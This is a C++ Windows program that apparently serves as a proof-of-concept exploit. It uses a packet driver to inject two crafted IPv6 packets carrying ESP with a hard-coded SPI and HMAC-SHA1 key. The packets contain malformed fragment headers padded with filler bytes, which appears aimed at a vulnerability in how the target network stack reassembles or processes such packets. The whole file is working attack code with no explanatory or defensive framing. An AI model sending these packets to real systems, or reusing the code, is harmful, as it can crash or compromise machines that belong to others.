﻿////////////////////////////////////////////////
// ScannerDemo.cpp文件

#include "../common/initsock.h"

#include <windows.h>
#include <stdio.h>

#include "ntddndis.h"

#include "protoutils.h"
#include "ProtoPacket.h"
#include <Stdint.h>
#include "Iphlpapi.h"
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Bcrypt.lib")

#include "../common/comm.h"


DWORD WINAPI SendThread(LPVOID lpParam);
BOOL GetGlobalData();

u_char	g_ucLocalMac[6];
DWORD	g_dwGatewayIP;
DWORD	g_dwLocalIP;
DWORD	g_dwMask;

CInitSock theSock;
BCRYPT_ALG_HANDLE       m_hAesAlg;
BCRYPT_KEY_HANDLE       m_hKey;
PBYTE                   m_pbKeyObject;
PBYTE                   m_pbIV;

//Handle for Hash
BCRYPT_HASH_HANDLE		m_hHash;
PBYTE					m_pbHashObject;
BCRYPT_ALG_HANDLE		m_hHashAlg;
BYTE rgbHash[0x14];

UCHAR str_SHA1_key[] =
"\xbc\x3d\x6e\x74\x2d\xd2\x13\xbe\x0b\xa9\x42\xb7\x33\xa4\x7a\xf4\x9b\xa2\xa8\x90";
UINT32 spi = htonl(0x861b157c);
void SHA1(PUCHAR str_data, DWORD len)
{

	BCRYPT_KEY_HANDLE	hKey = NULL;
	DWORD cbHashObject, cbResult, temp = 0;

	DWORD cbData = 0;
	BCryptOpenAlgorithmProvider(&m_hHashAlg, BCRYPT_SHA1_ALGORITHM, NULL, 8);
	//  Determine the size of the Hash object
	BCryptGetProperty(m_hHashAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbHashObject, sizeof(DWORD), &cbResult, 0);
	m_pbHashObject = (PBYTE)malloc(cbHashObject);
	//  Create the Hash object
	BCryptCreateHash(m_hHashAlg, &m_hHash, m_pbHashObject, cbHashObject, str_SHA1_key, 0x14, 0);
	// Hash the data
	BCryptHashData(m_hHash, (PBYTE)str_data, len, 0);
	// Finish the hash
	BCryptFinishHash(m_hHash, rgbHash, 0x14, 0);
	return;

}
BOOL GetGlobalData()
{
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG ulLen = 0;

	::GetAdaptersInfo(pAdapterInfo, &ulLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)::GlobalAlloc(GPTR, ulLen);

	if (::GetAdaptersInfo(pAdapterInfo, &ulLen) == ERROR_SUCCESS)
	{
		if (pAdapterInfo != NULL)
		{
			memcpy(g_ucLocalMac, pAdapterInfo->Address, 6);
			g_dwGatewayIP = ::inet_addr(pAdapterInfo->GatewayList.IpAddress.String);
			g_dwLocalIP = ::inet_addr(pAdapterInfo->IpAddressList.IpAddress.String);
			g_dwMask = ::inet_addr(pAdapterInfo->IpAddressList.IpMask.String);
		}
	}
	::GlobalFree(pAdapterInfo);
	return TRUE;
}
int main()
{
	GetGlobalData();
	if (!ProtoStartService())
	{
		printf(" ProtoStartService() failed %d \n", ::GetLastError());
		return -1;
	}
	HANDLE hControlDevice = ProtoOpenControlDevice();
	if (hControlDevice == INVALID_HANDLE_VALUE)
	{
		printf(" ProtoOpenControlDevice() failed() %d \n", ::GetLastError());
		ProtoStopService();
		return -1;
	}
	CPROTOAdapters adapters;
	if (!adapters.EnumAdapters(hControlDevice))
	{
		printf(" Enume adapter failed \n");
		ProtoStopService();
		return -1;
	}

	CAdapter adapter;
	if (!adapter.OpenAdapter(adapters.m_pwszSymbolicLink[0], FALSE))
	{
		printf(" OpenAdapter failed \n");
		ProtoStopService();
		return -1;
	}

	adapter.SetFilter(	//  NDIS_PACKET_TYPE_PROMISCUOUS|
		NDIS_PACKET_TYPE_DIRECTED |
		NDIS_PACKET_TYPE_MULTICAST | NDIS_PACKET_TYPE_BROADCAST);


	UCHAR ipv6_ESP_Fragment_1[] =
		"\x00\x0c\x29\x1c\x11\x93\x00\x0c\x29\x5c\x9a\x88\x86\xdd\x60\x00"
		"\x00\x00\x00\x38\x32\x40\xfe\x80\x00\x00\x00\x00\x00\x00\x81\x85"
		"\xb1\x51\x19\x43\x54\x19\xfe\x80\x00\x00\x00\x00\x00\x00\xf8\xe5"
		"\x70\x83\x16\x6f\xef\x6b"

		"\x41\x41\x41\x41\x00\x00\x00\x21"//SPI+Seq
		"\x2c\x00\x00\x01\x52\x52\x52\x52\x32\x00\x00\x01\x96\x74\xd9\x9d"
		"\x2b\x00\x00\x00\x00\x00\x00\x00\x2b\x00\x00\x00\x00\x00\x00\x00"
		"\x01\x02\x02\x2c"//ESP tail
		"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";//HMAC;
	UCHAR ipv6_ESP_Fragment_2[] =
		"\x00\x0c\x29\x1c\x11\x93\x00\x0c\x29\x5c\x9a\x88\x86\xdd\x60\x00"
		"\x00\x00\x00\x38\x32\x40\xfe\x80\x00\x00\x00\x00\x00\x00\x81\x85"
		"\xb1\x51\x19\x43\x54\x19\xfe\x80\x00\x00\x00\x00\x00\x00\xf8\xe5"
		"\x70\x83\x16\x6f\xef\x6b"

		"\x41\x41\x41\x41\x00\x00\x00\x22"//SPI+Seq
		"\x2c\x00\x00\x18\x52\x52\x52\x52\x32\x00\x00\x00\x96\x74\xd9\x9d"
		"\x2b\x00\x00\x00\x00\x00\x00\x00\x2b\x00\x00\x00\x00\x00\x00\x00"
		"\x01\x02\x02\x2c"//ESP tail
		"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";//HMAC;


	memcpy(ipv6_ESP_Fragment_1 + 0x36, &spi, 4);
	SHA1(&ipv6_ESP_Fragment_1[0x36], 0x2c);
	memcpy(ipv6_ESP_Fragment_1 + 0x62, rgbHash, 0x0c);

	memcpy(ipv6_ESP_Fragment_2 + 0x36, &spi, 4);
	SHA1(&ipv6_ESP_Fragment_2[0x36], 0x2c);
	memcpy(ipv6_ESP_Fragment_2 + 0x62, rgbHash, 0x0c);

	adapter.SendData(ipv6_ESP_Fragment_1, sizeof(ipv6_ESP_Fragment_1) - 1);

	adapter.SendData(ipv6_ESP_Fragment_2, sizeof(ipv6_ESP_Fragment_2) - 1);

	ProtoStopService();

	return 0;
}


